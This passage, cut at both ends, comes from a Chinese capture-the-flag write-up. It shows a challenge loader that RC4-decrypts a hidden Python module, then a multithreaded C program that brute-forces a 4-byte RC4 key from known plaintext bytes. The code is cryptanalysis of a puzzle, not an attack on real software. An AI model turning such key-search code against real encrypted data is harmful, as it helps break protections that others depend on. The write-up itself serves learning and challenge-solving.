ctypes.POINTER(BUF))</span><br><span class="line">fn = FNPROTO(ctypes.cast(SystemFunction033, ctypes.c_void_p).value)</span><br><span class="line">data = <span class="string">b&#x27;\xb7\xc3\xbc\xe5 &lt;skip&gt;&#x27;</span></span><br><span class="line">data_buffer = ctypes.create_string_buffer(data)</span><br><span class="line">key_buffer = ctypes.create_string_buffer(key_bytes)</span><br><span class="line">data_buf = BUF(<span class="built_in">len</span>(data), <span class="number">0</span>, ctypes.addressof(data_buffer))</span><br><span class="line">key_buf = BUF(<span class="number">4</span>, <span class="number">0</span>, ctypes.addressof(key_buffer))</span><br><span class="line">fn(ctypes.byref(data_buf), ctypes.byref(key_buf))</span><br><span class="line">pyd_path = os.path.join(os.getcwd(), <span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pyd_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data_buffer.raw[:<span class="built_in">len</span>(data)])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    spec = importlib.util.spec_from_file_location(<span class="string">&#x27;checkinput&#x27;</span>, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag: &#x27;</span>)</span><br><span class="line">    result = module.check(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Wrong key!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关于key的运算，可以看到魔数2166136261与16777619，可以判断是FNV哈希算法，然后哈希值被打包成4字节的小端字节序格式（<code>key_bytes</code>），用作RC4解密的密钥。将解密后的数据放入当前目录下的<code>checkinput.pyd</code>文件中，使用<code>importlib</code>动态导入该模块，并获取其中的<code>check</code>函数。用户被提示输入flag，并调用<code>module.check</code>进行验证。</p>
<p>所以接下来需要求得RC4的密钥</p>
<p>已知:</p>
<ul>
<li>密文前四个字节：<code>\xb7\xc3\xbc\xe5</code>   明文前四个：<code>4D 5A 90 00</code></li>
<li>密钥长度为 4 字节</li>
</ul>
<p>rc4短密钥爆破脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    MistHill, created on 10:24:34 2013-7-3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    compile:</span></span><br><span class="line"><span class="comment">        Visual Studio 6:</span></span><br><span class="line"><span class="comment">            CL /Og /Os /Oy /Ob1 /GT /Gs /Gf /Gy /G6 /MT rc4KStream75MT.c /link /RELEASE</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Refs:</span></span><br><span class="line"><span class="comment">    1) Optimizing C++/Code optimization/Faster operations</span></span><br><span class="line"><span class="comment">        http://en.wikibooks.org/wiki/Optimizing_C%2B%2B/Code_optimization/Faster_operations</span></span><br><span class="line"><span class="comment">    2) Writing Efficient C and C Code Optimization</span></span><br><span class="line"><span class="comment">        http://www.codeproject.com/Articles/6154/Writing-Efficient-C-and-C-Code-Optimization</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    3) Multithreading Tutorial #1</span></span><br><span class="line"><span class="comment">        http://www.computersciencelab.com/MultithreadingTut1.htm</span></span><br><span class="line"><span class="comment">    4) Walkthrough: Debugging a Multithreaded Application</span></span><br><span class="line"><span class="comment">        http://msdn.microsoft.com/en-us/library/bb157784(v=vs.90).aspx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGETKS1 0xe52c99fa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>*);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static int TargetKS1 = 0x62383550, TargetKS2 = 0x6F0C1E2C; /* Target KS = 50 35 38 62 2C 1E 0C 6F */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KeyLength 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szErrMsgCT[] =<span class="string">&quot;Create thread%d failed!\n&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtHex2[] =<span class="string">&quot;%02X &quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtDate[] =<span class="string">&quot;\n%s\t%04d-%02d-%02d %02d:%02d:%02d.%03d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> stateinit[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> Key[<span class="number">8</span>], KeyT1[<span class="number">8</span>], KeyT2[<span class="number">8</span>], KeyT3[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Size: just 4 is fine. Exec. time of function GetKeyStream() reduced!</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> KeyStream[<span class="number">4</span>], KeyStreamT1[<span class="number">4</span>], KeyStreamT2[<span class="number">4</span>], KeyStreamT3[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">256</span>], stateT1[<span class="number">256</span>], stateT2[<span class="number">256</span>], stateT3[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> SYSTEMTIME lt0, lt1;</span><br><span class="line"><span class="type">static</span> DWORD dw0, dw1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    HANDLE hThread[<span class="number">3</span>];</span><br><span class="line">    <span class="type">unsigned</span> threadID[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetConsoleCtrlHandler</span>( (PHANDLER_ROUTINE)ConsoleHandler, TRUE)==FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to install handler!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt0);</span><br><span class="line">    dw0 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">256</span>; i++)</span><br><span class="line">        stateinit[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the threads.</span></span><br><span class="line">    hThread[<span class="number">0</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT1,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">0</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">1</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT2,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">2</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT3,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">2</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">2</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _Recursion(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">3</span>, hThread, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ShowExecutionTime</span>(FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x30~0x7A: T0(0x30~0x42), T1(0x43~0x55), T2(0x56~0x68), T3(0x69~0x7A)</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++) &#123;</span><br><span class="line">        Key[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, Key, KeyStream, state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">64</span>;i&lt;<span class="number">128</span>;i++) &#123;</span><br><span class="line">        KeyT1[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT1, KeyStreamT1, stateT1);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">128</span>;i&lt;<span class="number">192</span>;i++) &#123;</span><br><span class="line">        KeyT2[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT2, KeyStreamT2, stateT2);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">192</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        KeyT3[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT3, KeyStreamT3, stateT3);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        pKey[idx] = i;</span><br><span class="line">        <span class="keyword">if</span>(idx <span class="number">+1</span> &lt; KeyLength)</span><br><span class="line">            <span class="built_in">Recursion</span>(idx <span class="number">+1</span>, pKey, pKeyStream, pstate);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pstate, stateinit,<span class="built_in">sizeof</span>(stateinit));</span><br><span class="line">            <span class="built_in">prepare_key</span>(pKey, KeyLength, pstate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">GetKeyStream</span>(pKeyStream,<span class="built_in">sizeof</span>(KeyStream), pstate) )</span><br><span class="line">                <span class="built_in">ShowMatchedKeystream</span>(pKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> index1, index2;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    index1 = index2 =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt;<span class="number">256</span>; counter++)</span><br><span class="line">    &#123;</span><br><span class="line">        index2 = key_data_ptr[index1] + state[counter] + index2;</span><br><span class="line"></span><br><span class="line">        swapByte = state[counter];</span><br><span class="line">        state[counter] = state[index2];</span><br><span class="line">        state[index2] = swapByte;</span><br><span class="line"></span><br><span class="line">        index1++;</span><br><span class="line">        <span class="keyword">while</span>(index1 == key_data_len)</span><br><span class="line">            index1 -= key_data_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> x;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> y;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xorIndex;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    x = y =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt; buffer_len; counter ++)</span><br><span class="line">    &#123;</span><br><span class="line">        x++;</span><br><span class="line">        y = state[x] + y;</span><br><span class="line"></span><br><span class="line">        swapByte = state[x];</span><br><span class="line">        state[x] = state[y];</span><br><span class="line">        state[y] = swapByte;</span><br><span class="line"></span><br><span class="line">        xorIndex = state[x] + state[y];</span><br><span class="line"></span><br><span class="line">        buffer_ptr[counter] = state[xorIndex];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( *(<span class="type">int</span>*)buffer_ptr == TARGETKS1 )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwCtrlType == CTRL_C_EVENT) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dwCtrlType == CTRL_BREAK_EVENT)</span><br><span class="line">        <span class="built_in">ShowExecutionTime</span>(TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt1);</span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bBreaked) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nCurrent Keys:\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;Start:&quot;</span>, lt<span class="number">0.</span>wYear, lt<span class="number">0.</span>wMonth, lt<span class="number">0.</span>wDay, lt<span class="number">0.</span>wHour, lt<span class="number">0.</span>wMinute, lt<span class="number">0.</span>wSecond, lt<span class="number">0.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;End:&quot;</span>, lt<span class="number">1.</span>wYear, lt<span class="number">1.</span>wMonth, lt<span class="number">1.</span>wDay, lt<span class="number">1.</span>wHour, lt<span class="number">1.</span>wMinute, lt<span class="number">1.</span>wSecond, lt<span class="number">1.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nExecution time:\t%d.%d seconds.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span 